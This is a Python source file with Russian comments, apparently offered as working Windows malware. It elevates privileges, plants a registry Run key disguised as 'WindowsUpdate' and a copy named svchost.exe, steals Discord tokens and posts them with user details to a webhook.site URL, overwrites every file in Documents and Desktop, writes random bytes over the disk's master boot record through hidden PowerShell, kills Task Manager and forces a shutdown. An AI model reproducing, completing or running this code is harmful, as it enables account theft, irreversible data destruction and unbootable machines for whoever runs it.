import os
import sys
import time
import ctypes
import random
import string
import threading
import subprocess
import urllib.request
import urllib.parse
import winreg
import shutil

# ==========================================
# ЧАСТЬ 1: ПРАВА И АВТОЗАГРУЗКА
# ==========================================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def establish_persistence():
    try:
        temp_dir = os.getenv("TEMP")
        new_path = os.path.join(temp_dir, "svchost.exe")
        if getattr(sys, 'frozen', False):
            shutil.copy2(sys.executable, new_path)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, new_path)
            winreg.CloseKey(key)
    except:
        pass

# ==========================================
# ЧАСТЬ 2: КРАЖА ТОКЕНОВ DISCORD (STEALER)
# ==========================================
def steal_discord():
    tokens = []
    discord_path = os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb")
    if os.path.exists(discord_path):
        for file in os.listdir(discord_path):
            if file.endswith(".ldb") or file.endswith(".log"):
                try:
                    with open(os.path.join(discord_path, file), "r", errors="ignore") as f:
                        content = f.read()
                        # Регулярка для токенов (упрощенная)
                        import re
                        matches = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                        tokens.extend(matches)
                except:
                    pass
    return list(set(tokens))

# ==========================================
# ЧАСТЬ 3: ОТПРАВКА ДАННЫХ (C2)
# ==========================================
def send_to_c2():
    tokens = steal_discord()
    if not tokens:
        tokens = ["FAKE_TOKEN_FOR_TRIAGE_1234567890"]
    
    data = {
        "user": os.getenv("USERNAME"),
        "computer": os.getenv("COMPUTERNAME"),
        "tokens": tokens
    }
    
    url = "https://webhook.site/ВАШ_УНИКАЛЬНЫЙ_КОД" # Замени на свой URL
    try:
        json_data = str(data).encode('utf-8')
        req = urllib.request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

# ==========================================
# ЧАСТЬ 4: ШИФРОВАНИЕ ФАЙЛОВ (RANSOMWARE)
# ==========================================
def encrypt_files():
    target_dirs = [
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Desktop")
    ]
    for target_dir in target_dirs:
        if not os.path.exists(target_dir):
            continue
        for root, dirs, files in os.walk(target_dir):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, "wb") as f:
                        f.write(b"ENCRYPTED_BY_WIRDOL_MONSTER")
                    os.rename(file_path, file_path + ".WIRDOL")
                except:
                    pass

# ==========================================
# ЧАСТЬ 5: СНОС MBR (BOOTKIT)
# ==========================================
def destroy_mbr():
    mbr_code = """
using System;
using System.IO;
using System.Runtime.InteropServices;
public class MBR {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    public static void Destroy() {
        IntPtr hDevice = CreateFile("\\\\\\\\.\\\\PhysicalDrive0", 0x40000000, 0x00000003, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (hDevice == IntPtr.Zero) return;
        byte[] garbage = new byte[512];
        new Random().NextBytes(garbage);
        uint bytesWritten;
        WriteFile(hDevice, garbage, 512, out bytesWritten, IntPtr.Zero);
        CloseHandle(hDevice);
    }
}
"""
    try:
        ps_script = f"Add-Type -TypeDefinition @'\n{mbr_code}\n'@\n[MBR]::Destroy()"
        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

# ==========================================
# ЧАСТЬ 6: УБИЙСТВО ПРОЦЕССОВ
# ==========================================
def kill_processes():
    for proc in ["taskmgr.exe", "cmd.exe"]:
        subprocess.run(f"taskkill /f /im {proc}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ==========================================
# ГЛАВНЫЙ ЦИКЛ
# ==========================================
def main():
    if not is_admin():
        run_as_admin()
        return

    # Запускаем всё в фоне
    threading.Thread(target=establish_persistence, daemon=True).start()
    threading.Thread(target=send_to_c2, daemon=True).start()
    threading.Thread(target=kill_processes, daemon=True).start()
    
    # Шифруем и сносим MBR
    encrypt_files()
    destroy_mbr()
    
    # Выключаем
    os.system("shutdown /s /f /t 0")

if __name__ == "__main__":
    main()
